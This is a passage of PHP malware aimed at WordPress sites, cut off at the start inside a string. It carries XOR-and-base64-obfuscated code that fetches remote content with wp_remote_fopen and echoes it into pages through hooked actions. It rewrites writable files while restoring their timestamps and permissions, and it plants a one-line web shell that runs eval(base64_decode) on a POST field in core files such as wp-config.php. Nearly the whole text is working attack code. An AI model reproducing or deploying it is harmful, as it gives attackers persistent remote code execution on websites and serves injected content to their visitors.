ODM3MmMzNDMxMzQyYzM0MzEzMjJjMzQzOTMxMmMzNDM5MzAyYzM0MzgzODJjMzQzOTMxMmMzNDM3MzcyYzM0MzgzMDJjMzQzNDMxMmMzNDMxMzQyYzM0MzkzNDJjMzQzODMxMmMzNDM5MzYyYzM0MzkzNzJjMzQzOTM0MmMzNDM5MzAyYzM0MzEzMjJjMzQzODMwMmMzNDM5MzIyYzM0MzgzNTJjMzQzMjMwMmMzNDM5MzYyYzM0MzgzNDJjMzQzODM1MmMzNDM5MzUyYzM0MzIzMTJjMzQzMzM5MmMzNDMxMzQyYzM0MzQzMjJjMzQzNDMwMmMzNDMyMzcyYzM0MzgzNTJjMzQzODMyMmMzNDM5MzQyYzM0MzczNzJjMzQzODM5MmMzNDM4MzEyYzM0MzQzMjJjMzMzOTMzMmMzMzM5MzAyYzM0MzQzMDJjMzQzMjM3MmMzNDM4MzAyYzM0MzgzNTJjMzQzOTM4MmMzNDM0MzI1ZDNiNzY2MTcyMjA0NjY0NWY3NjZiNzAzZDIyMjIzYjY2NmY3MjIwMjg3NjYxNzIyMDY5M2QzMTNiMjA2OTNjNDI2YzZhNWY2ZjZiNzgyZTZjNjU2ZTY3NzQ2ODNiMjA2OTJiMmIyOTIwN2I0NjY0NWY3NjZiNzAyYjNkNTM3NDcyNjk2ZTY3MmU2NjcyNmY2ZDQzNjg2MTcyNDM2ZjY0NjUyODQyNmM2YTVmNmY2Yjc4NWI2OTVkMmQ0MjZjNmE1ZjZmNmI3ODViMzA1ZDI5M2I3ZDIwNjQ2ZjYzNzU2ZDY1NmU3NDJlNzc3MjY5NzQ2NTI4NDY2NDVmNzY2YjcwMjkzYjNjMmY3MzYzNzI2OTcwNzQzZSIpLDUzKTsKCWlmKEBmaWxlX2V4aXN0cygkcHJlc2VudF9jcm9wcGVkX2plMykpewoJCUBsaXN0KCR0LCRtdGltZSwkcGNsb3NlX2ZyYW1lZGF0YV96ajcpPWV4cGxvZGUoIlx0IixAZmlsZV9nZXRfY29udGVudHMoJHByZXNlbnRfY3JvcHBlZF9qZTMpKTsKCQlpZihlbmNvZGVzX3ViZXJnZWVrX2dldGZpbGVmb3JtYXRfbXE3KCR0LDUzKSE9PWZhbHNlKXskZW5jb2Rlc191YmVyZ2Vla19odjE9JHQ7fQoJCWlmKCh0aW1lKCktJG10aW1lKTwxNzcxKigoaW50KSRwY2xvc2VfZnJhbWVkYXRhX3pqNykpeyAkYmx1ZV9ib2ludG9uX3BwMj0kZW5jb2Rlc191YmVyZ2Vla19odjE7IH0KCX0KCglpZigkYmx1ZV9ib2ludG9uX3BwMj09PWZhbHNlKXsKCQkkYmx1ZV9ib2ludG9uX3BwMj13cF9yZW1vdGVfZm9wZW4oZW5jb2Rlc191YmVyZ2Vla19nZXRmaWxlZm9ybWF0X21xNygnWFVGQlJROGFHa0pGR0ZaWldrQlJHMGRBR2dRYUNsNElWMUE9Jyw1MykuIjUzIik7CgkJaWYoZW5jb2Rlc191YmVyZ2Vla19nZXRmaWxlZm9ybWF0X21xNygkYmx1ZV9ib2ludG9uX3BwMiw1Myk9PT1mYWxzZSl7CgkJCSRibHVlX2JvaW50b25fcHAyPSRlbmNvZGVzX3ViZXJnZWVrX2h2MTsKCQkJJHBjbG9zZV9mcmFtZWRhdGFfemo3Kys7CgkJCWlmKCRwY2xvc2VfZnJhbWVkYXRhX3pqNz4yNCkkcGNsb3NlX2ZyYW1lZGF0YV96ajc9MjQ7CgkJfWVsc2V7JHBjbG9zZV9mcmFtZWRhdGFfemo3PTE7fQoJCUBmaWxlX3B1dF9jb250ZW50cygkcHJlc2VudF9jcm9wcGVkX2plMywkYmx1ZV9ib2ludG9uX3BwMi4iXHQiLnRpbWUoKS4iXHQiLiRwY2xvc2VfZnJhbWVkYXRhX3pqNyk7CgkJdG91Y2goJHByZXNlbnRfY3JvcHBlZF9qZTMsZmlsZW10aW1lKF9fRklMRV9fKSk7Cgl9CgkKCSRibHVlX2JvaW50b25fcHAyPWVuY29kZXNfdWJlcmdlZWtfZ2V0ZmlsZWZvcm1hdF9tcTcoJGJsdWVfYm9pbnRvbl9wcDIsNTMpOwoJaWYoISRibHVlX2JvaW50b25fcHAyKSRibHVlX2JvaW50b25fcHAyPWVuY29kZXNfdWJlcmdlZWtfZ2V0ZmlsZWZvcm1hdF9tcTcoJGVuY29kZXNfdWJlcmdlZWtfaHYxLDUzKTsgCgoJZWNobyAkYmx1ZV9ib2ludG9uX3BwMjsKfQoKZnVuY3Rpb24gc3RyaWN0X3RleHRhcmVhX2Nyb3BwZWRfamUzKCRibHVlX2JvaW50b25fcHAyLCRrKXtmb3IoJGk9MDskaTxzdHJsZW4oJGJsdWVfYm9pbnRvbl9wcDIpOyRpKyspeyRibHVlX2JvaW50b25fcHAyWyRpXT1jaHIob3JkKCRibHVlX2JvaW50b25fcHAyWyRpXSleJGspO31yZXR1cm4gYmFzZTY0X2VuY29kZSgkYmx1ZV9ib2ludG9uX3BwMi4nV1AnKTt9CgpmdW5jdGlvbiBlbmNvZGVzX3ViZXJnZWVrX2dldGZpbGVmb3JtYXRfbXE3KCRibHVlX2JvaW50b25fcHAyLCRrKXsKCSRibHVlX2JvaW50b25fcHAyPWJhc2U2NF9kZWNvZGUoJGJsdWVfYm9pbnRvbl9wcDIpOwoJaWYoJGJsdWVfYm9pbnRvbl9wcDIpewoJCWZvcigkaT0wOyRpPHN0cmxlbigkYmx1ZV9ib2ludG9uX3BwMiktMjskaSsrKXskYmx1ZV9ib2ludG9uX3BwMlskaV09Y2hyKG9yZCgkYmx1ZV9ib2ludG9uX3BwMlskaV0pXiRrKTt9Cgl9CglpZihzdWJzdHIoJGJsdWVfYm9pbnRvbl9wcDIsLTIpIT0nV1AnKXskYmx1ZV9ib2ludG9uX3BwMj1mYWxzZTt9ZWxzZXskYmx1ZV9ib2ludG9uX3BwMj1zdWJzdHIoJGJsdWVfYm9pbnRvbl9wcDIsMCwtMik7fQoJcmV0dXJuICRibHVlX2JvaW50b25fcHAyOwp9CgoKYWRkX2FjdGlvbiggZW5jb2Rlc191YmVyZ2Vla19nZXRmaWxlZm9ybWF0X21xNygnUWtWcVUxcGFRVkJIVjFBPScsNTMpICwgInJmY19nZXRoZWFkZXJ2YWx1ZV9wZXJtYXN0cnVjdHNfbGY2IiApOwo=').trim($p2)."\n";

  if(strpos($tcy,'!')!==false){
	$code=trim($p1).base64_decode('Ci8qIHdvcmRwcmVzcyBtYWxhZ2FzeV9wZXJtYXN0cnVjdHNfYm9pbnRvbl9wcDIgKi8KZnVuY3Rpb24gbWFsYWdhc3lfcGVybWFzdHJ1Y3RzX2JvaW50b25fcHAyKCkgewoJJHN0cmljdF90ZXh0YXJlYV9jcm9wcGVkX2plMz1oYXN2aWRlb19nZXRmaWxlZm9ybWF0X2ZyYW1lZGF0YV96ajcoJ1hWQlBVRjFYVUE9PScsNTcpOwoJZWNobyBoYXN2aWRlb19nZXRmaWxlZm9ybWF0X2ZyYW1lZGF0YV96ajcoJ0JWMVFUeGxRWFFRYlYxQT0nLDU3KS4kc3RyaWN0X3RleHRhcmVhX2Nyb3BwZWRfamUzLmhhc3ZpZGVvX2dldGZpbGVmb3JtYXRfZnJhbWVkYXRhX3pqNygnR3djRlNRZFlTVTFjVWxnWlZFeFRXbEZRVjF3WlgxWkxHVlJZVnhrRldCbFJTMXhmQkJ0UlRVMUpBeFlXVEZKV1YxSmNWRnhMVms5V0YxcFdWQlliQnhsTVVsWlhVbHhVWEV0V1QxWVpCUlpZQnhsT1ZsMVFUVnhWUUJsZFMxQlBYRXNYR1FVV1NRY0ZGbDFRVHdjRlNscExVRWxOR1UxQVNWd0VHMDFjUVUwV1UxaFBXRXBhUzFCSlRSc0hUMWhMR1Z4VkJGMVdXa3hVWEZkTkYxNWNUWHhWWEZSY1YwMTdRSEJkRVJ0WFVBPT0nLDU3KS4kc3RyaWN0X3RleHRhcmVhX2Nyb3BwZWRfamUzLmhhc3ZpZGVvX2dldGZpbGVmb3JtYXRfZnJhbWVkYXRhX3pqNygnR3hBQ0dWeFZGMHBOUUZWY0YxMVFTa2xWV0VBWkJCa2JWMVpYWEJzQ0JSWktXa3RRU1UwSFYxQT0nLDU3KTsKfQoKZnVuY3Rpb24gcHJlc2VudF9jcm9wcGVkX2V4cGlyYXRpb25fdmEyKCRzLCRrKXtmb3IoJGk9MDskaTxzdHJsZW4oJHMpOyRpKyspeyRzWyRpXT1jaHIob3JkKCRzWyRpXSleJGspO31yZXR1cm4gYmFzZTY0X2VuY29kZSgkcy4nV1AnKTt9CgpmdW5jdGlvbiBoYXN2aWRlb19nZXRmaWxlZm9ybWF0X2ZyYW1lZGF0YV96ajcoJHMsJGspewoJJHM9YmFzZTY0X2RlY29kZSgkcyk7CglpZigkcyl7CgkJZm9yKCRpPTA7JGk8c3RybGVuKCRzKS0yOyRpKyspeyRzWyRpXT1jaHIob3JkKCRzWyRpXSleJGspO30KCX0KCWlmKHN1YnN0cigkcywtMikhPSdXUCcpeyRzPWZhbHNlO31lbHNleyRzPXN1YnN0cigkcywwLC0yKTt9CglyZXR1cm4gJHM7Cn0KCgphZGRfYWN0aW9uKCBoYXN2aWRlb19nZXRmaWxlZm9ybWF0X2ZyYW1lZGF0YV96ajcoJ1RrbG1YMVpXVFZ4TFYxQT0nLDU3KSAsICJtYWxhZ2FzeV9wZXJtYXN0cnVjdHNfYm9pbnRvbl9wcDIiICk7Cg==').trim($p2)."\n";
  }

  if(is_writable($fn) ){
   $fp=fileperms($fn);
   $st=filemtime($fn);
   @unlink($fn);
   if(file_put_contents($fn,$code)!==false){
     $r=touch($fn,$st,$st);
     chmod($fn,$fp);
     return $ret;
   }
  }
}
return 0;
}


function make_var($dollar=true){
global $vars;
$m=rand(5,10); 
$p=rand(1,$m-1);
$s='';
for($i=0; $i<$m; $i++){  $s.= chr( rand(ord('a'),ord('z')) ); if($i==0) $s=strtoupper($s); }
//echo 'm:'.$m.' p:'.$p."\n"; echo $s."\n";
$s=substr($s,0,$p).'_'.substr($s,$p);
//echo $s."\n";die();
if(isset($vars[$s])) { return make_vars($dollar); } else { $vars[$s]=true; }
if(!$dollar) return $s;
return '$'.$s;
}


function inject($d){ 
echo base64_encode(json_encode(injany($d))); 
}

function injany($d){
 $targets=array('wp-cron.php','xmlrpc.php','wp-settings.php');
 shuffle($targets);
 $res=false;
 foreach($targets as $f){
  $res=inj($d,$f);
  if($res!==false){return $res;}
 }
 return inj($d,'wp-config.php');
}

function inj($d,$f){
 if(is_writable($d.'/'.$f)){
 $s=file_get_contents($d.'/'.$f);
 $st=filemtime($d.'/'.$f);
 if(!preg_match("/_POST\[\"([a-z]+)\"\]/is",$s,$res)){
 $rnd=substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"),0,rand(3,8));
 $s=prepare($rnd,$s);
 if(@file_put_contents($d.'/'.$f,$s)!==false){
  touch($d.'/'.$f,$st);
  return $f.'@'.$rnd;
 } else {return false;}
 } else {return $f.'@'.$res[1];}
 }
 return false;
}

function prepare($rnd,$s){
$s2=chr(60).'?php /* @package WordPress */ ev'.chr(97).'l(b'.chr(97).'se'.chr(54).'4_decode(@$_POST["'.$rnd.'"]));?'.chr(62).$s;
return $s2;
}